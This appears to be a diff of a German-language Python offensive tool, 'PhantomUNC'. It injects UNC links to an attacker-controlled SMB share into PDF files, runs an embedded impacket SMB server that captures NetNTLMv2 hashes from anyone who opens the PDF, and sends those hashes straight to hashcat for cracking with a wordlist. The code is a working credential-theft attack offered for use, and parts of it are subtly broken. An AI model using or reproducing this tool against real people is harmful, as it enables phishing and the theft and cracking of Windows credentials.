@@ -1,22 +1,37 @@
 #!/usr/bin/env python3
-import fitz
 import os
 import sys
+import fitz
 import argparse
+import shutil
+import threading
 import datetime
 import subprocess
-import threading
-import time
-import shutil
+from impacket.examples import logger
+from impacket.smbserver import SimpleSMBServer
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthChallengeResponse, NTLMAuthNegotiate
 
 # Farben
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
 BLUE = "\033[94m"
+CYAN = "\033[96m"
 RESET = "\033[0m"
 
-LOGFILE = "phantomunc.log"
+# Logfile mit Datum & Uhrzeit in /var/log
+now = datetime.datetime.now()
+LOGFILE = f"/var/log/phantomunc_{now.strftime('%Y-%m-%d_%H-%M-%S')}.log"
+HASHFILE = os.path.join(os.getcwd(), f"phantomunc_hashes_{now.strftime('%Y-%m-%d')}.txt")
+
+def log(msg):
+    timestamp = now.strftime("[%Y-%m-%d %H:%M:%S]")
+    with open(LOGFILE, "a") as f:
+        f.write(f"{timestamp} {msg}\n")
+
+def save_hash(line):
+    with open(HASHFILE, "a") as hf:
+        hf.write(line + "\n")
 
 def print_banner():
     banner = rf"""{RED}
@@ -26,15 +41,39 @@ def print_banner():
 ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║██║   ██║██║╚██╗██║██║     
 ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║╚██████╔╝██║ ╚████║╚██████╗
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
-                                                                
-    {BLUE}by ML-CyberSec – U Unified SMB-Link Generator & NTLM Capture Tool{RESET}
+{BLUE}by ML-CyberSec – Unified SMB-Link Generator NTLM Capture Tool mit Integriertem SMB Server{RESET}
 """
     print(banner)
 
-def log(msg):
-    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M]")
-    with open(LOGFILE, "a") as f:
-        f.write(f"{timestamp} {msg}\n")
+class PhantomUNCServer(SimpleSMBServer):
+    def __init__(self, listenAddress='0.0.0.0', listenPort=445):
+        super().__init__(listenAddress=listenAddress, listenPort=listenPort)
+
+    def onAuthRequest(self, smbServer, connId, authRequest):
+        clientIP = smbServer.getClientIP(connId)
+        try:
+            username = authRequest['USERNAME'].decode(errors='ignore')
+            domain = authRequest['DOMAIN'].decode(errors='ignore')
+            challenge = authRequest['CHALLENGE']
+            response = authRequest['LM_RESPONSE'] + authRequest['NT_RESPONSE']
+            hash_string = f"{username}::{domain}:{challenge.hex()}:{response.hex()}"
+            print(f"{GREEN}🔑 Hash erhalten von {clientIP}: {hash_string}{RESET}")
+            save_hash(hash_string)
+            run_hashcat(wordlist_path=args.wordlist)
+        except Exception as e:
+            print(f"{RED}❌ Fehler beim Parsen der NTLM-Authentifizierung: {e}{RESET}")
+
+def run_hashcat(wordlist_path=None):
+    if not os.path.exists(HASHFILE):
+        print(f"{RED}❌ Kein Hashfile vorhanden: {HASHFILE}{RESET}")
+        return
+    if not wordlist_path:
+        wordlist_path = input(f"{CYAN}🔤 Pfad zur Wordlist angeben (z. B. /usr/share/wordlists/rockyou.txt): {RESET}").strip()
+    if not os.path.isfile(wordlist_path):
+        print(f"{RED}❌ Wordlist nicht gefunden: {wordlist_path}{RESET}")
+        return
+    print(f"{YELLOW}🚀 Starte Hashcat...{RESET}")
+    os.system(f"hashcat -m 5600 {HASHFILE} {wordlist_path} --force")
 
 def create_pdf(input_file, output_file, target_dir, unc_path):
     try:
@@ -57,116 +96,77 @@ def create_pdf(input_file, output_file, target_dir, unc_path):
         print(f"{RED}❌ Fehler bei PDF-Erstellung: {e}{RESET}")
         sys.exit(1)
 
-def capture_smb_output(proc):
+def start_embedded_smb_server(share_name, share_path, port=445, listen_ip='0.0.0.0'):
+    logger.init()
+    server = PhantomUNCServer(listenAddress=listen_ip, listenPort=port)
+    server.addShare(share_name, share_path, "")
+    server.setSMB2Support(True)
+    server.setLogFile(LOGFILE)
+    print(f"{YELLOW}📡 SMB-Server läuft auf {listen_ip}:{port}, Share: {share_name} ({share_path}){RESET}")
+    log(f"SMB gestartet → {listen_ip}:{port}, Share={share_name}, Pfad={share_path}")
+    threading.Thread(target=server.start, daemon=True).start()
+    return server
+
+def install_ngrok():
     try:
-        for line in iter(proc.stdout.readline, b''):
-            decoded = line.decode("utf-8", errors="ignore").strip()
-            if "NTLM" in decoded or "AUTH" in decoded:
-                print(f"{BLUE}📥 {decoded}{RESET}")
-                log(f"SMB: {decoded}")
-    except Exception as e:
-        print(f"{RED}❌ Fehler beim SMB-Log-Capture: {e}{RESET}")
-
-def start_smb_server(share, directory):
-    print(f"{YELLOW}📡 Starte SMB-Server: Share={share}, Ordner={directory}{RESET}")
-    if not os.path.exists(directory):
-        os.makedirs(directory)
-
-    command = [
-        "sudo", "python3",
-        "/usr/share/doc/python3-impacket/examples/smbserver.py",
-        share, directory, "-smb2support"
-    ]
-
-    try:
-        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        threading.Thread(target=capture_smb_output, args=(proc,), daemon=True).start()
-        log(f"SMB-Server gestartet: Share={share}, Ordner={directory}")
-        return proc
-    except Exception as e:
-        print(f"{RED}❌ SMB-Server konnte nicht gestartet werden: {e}{RESET}")
-        sys.exit(1)
-
-def start_ngrok(port=445):
-    print(f"{BLUE}🌐 Starte ngrok Tunnel für Port {port}...{RESET}")
-    try:
-        if not shutil.which("ngrok"):
-            print(f"{RED}❌ ngrok nicht gefunden. Bitte installiere es und stelle sicher, dass es im PATH ist.{RESET}")
-            sys.exit(1)
-
-        ngrok_cmd = ["ngrok", "tcp", str(port)]
-        ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-        time.sleep(5)
-        url_out = subprocess.check_output(["curl", "-s", "http://127.0.0.1:4040/api/tunnels"])
-        url_str = url_out.decode()
-        start = url_str.find("tcp://")
-        end = url_str.find('"', start)
-        public_url = url_str[start:end]
-        unc_link = public_url.replace("tcp://", "").replace(":", "@")
-
-        print(f"{GREEN}✅ Öffentlich erreichbarer UNC-Link: \\\\{unc_link}\\share{RESET}")
-        log(f"ngrok gestartet: {public_url}")
-        return ngrok_proc
-
-    except Exception as e:
-        print(f"{RED}❌ Fehler beim Starten von ngrok: {e}{RESET}")
-        sys.exit(1)
+        print(f"{YELLOW}📥 Lade ngrok herunter...{RESET}")
+        subprocess.run("wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip -O /tmp/ngrok.zip", shell=True, check=True)
+        subprocess.run("unzip -o /tmp/ngrok.zip -d /tmp", shell=True, check=True)
+        subprocess.run("sudo mv /tmp/ngrok /usr/local/bin/", shell=True, check=True)
+        subprocess.run("sudo chmod +x /usr/local/bin/ngrok", shell=True, check=True)
+        print(f"{GREEN}✅ ngrok wurde erfolgreich installiert.{RESET}")
+    except subprocess.CalledProcessError:
+        print(f"{RED}❌ Fehler bei der Installation von ngrok.{RESET}")
 
 def main():
     print_banner()
 
+    if shutil.which("ngrok") is None:
+        install = input(f"{YELLOW}❓ ngrok ist NICHT installiert. Jetzt automatisch installieren? [J/N]: {RESET}").strip().lower()
+        if install == "j":
+            install_ngrok()
+
+
     parser = argparse.ArgumentParser(
-        description="PhantomUNC – Unified SMB-Link Generator & NTLM Capture Tool",
-        epilog="""
-Beispiel 1: Nur PDF erzeugen
-  python3 phantomunc_server.py --build-pdf -in Original.pdf -out Angriff.pdf -D Output/ --unc "\\\\192.168.0.158\\share"
+        description=f"""
+{CYAN}PhantomUNC – PDF UNC Injector + Integrierter SMB Server{RESET}
 
-Beispiel 2: Komplettsetup mit ngrok + SMB-Server
-  python3 phantomunc_server.py --build-pdf -in Original.pdf -out Angriff.pdf -D Output/ --use-ngrok --run-server -s share -d /tmp/loot
-""",
-        formatter_class=argparse.RawDescriptionHelpFormatter
-    )
-
-    parser.add_argument("--build-pdf", action="store_true", help="PDF mit SMB-Link erzeugen")
+{YELLOW}Beispiele:{RESET}
+  {GREEN}phantomunc --build-pdf -in input.pdf -out attack.pdf -D ./output{RESET}
+  {GREEN}phantomunc --build-pdf -in input.pdf -out attack.pdf -D ./out --unc \\10.0.0.1\share{RESET}
+  {GREEN}phantomunc --run-server -d /tmp/smbshare -s share{RESET}
+  {GREEN}phantomunc --build-pdf -in file.pdf -out a.pdf -D . --run-server --port 1445{RESET}"""
+    , formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument("--build-pdf", action="store_true", help="PDF mit UNC-Link erstellen")
     parser.add_argument("-in", dest="input_file", help="Pfad zur Eingabe-PDF")
-    parser.add_argument("-out", help="Name der Zieldatei")
+    parser.add_argument("-out", help="Zielname der PDF")
     parser.add_argument("-D", help="Zielverzeichnis")
-    parser.add_argument("--unc", default="\\\\192.168.0.158\\share", help="UNC-Link für das PDF")
-
-    parser.add_argument("--run-server", action="store_true", help="Starte SMB-Server zur Authentifizierung")
-    parser.add_argument("-s", "--share", default="share", help="Name des Shares")
-    parser.add_argument("-d", "--directory", default="/tmp/share", help="Ordner zur Freigabe")
-
-    parser.add_argument("--use-ngrok", action="store_true", help="ngrok-Tunnel für SMB aktivieren")
+    parser.add_argument("--unc", default="\\\\192.168.0.158\\share", help="UNC-Link")
+    parser.add_argument("--run-server", action="store_true", help="SMB-Server starten")
+    parser.add_argument("-s", "--share", default="share", help="Name des SMB-Shares")
+    parser.add_argument("-d", "--directory", default="/tmp/share", help="Pfad für SMB-Dateien")
+    parser.add_argument("--port", type=int, default=445, help="Port für SMB-Server")
+    parser.add_argument("--wordlist", help="Pfad zur Wordlist für Hashcat (optional)")
 
     args = parser.parse_args()
 
     if args.build_pdf:
         if not args.input_file or not args.out or not args.D:
-            print(f"{RED}❗ Bitte -in, -out und -D für PDF-Erstellung angeben!{RESET}")
+            print(f"{RED}❗ Bitte -in, -out und -D angeben!{RESET}")
             sys.exit(1)
         create_pdf(args.input_file, args.out, args.D, args.unc)
 
-    ngrok_proc = None
-    if args.use_ngrok:
-        ngrok_proc = start_ngrok()
-
-    smb_proc = None
     if args.run_server:
-        smb_proc = start_smb_server(args.share, args.directory)
+        if not os.path.exists(args.directory):
+            os.makedirs(args.directory)
+        start_embedded_smb_server(args.share, args.directory, port=args.port)
 
-    if smb_proc or ngrok_proc:
-        print(f"{BLUE}⏳ Warte auf Verbindungen... Logs in {LOGFILE}{RESET}")
+    if args.run_server:
         try:
             while True:
-                time.sleep(2)
+                pass
         except KeyboardInterrupt:
-            print(f"{YELLOW}\n🛑 Beende Prozesse...{RESET}")
-            if smb_proc: smb_proc.kill()
-            if ngrok_proc: ngrok_proc.kill()
-            print(f"{GREEN}✅ Alles gestoppt.{RESET}")
-
+            print(f"{YELLOW}🛑 Server gestoppt.{RESET}")
 
 if __name__ == "__main__":
     main()
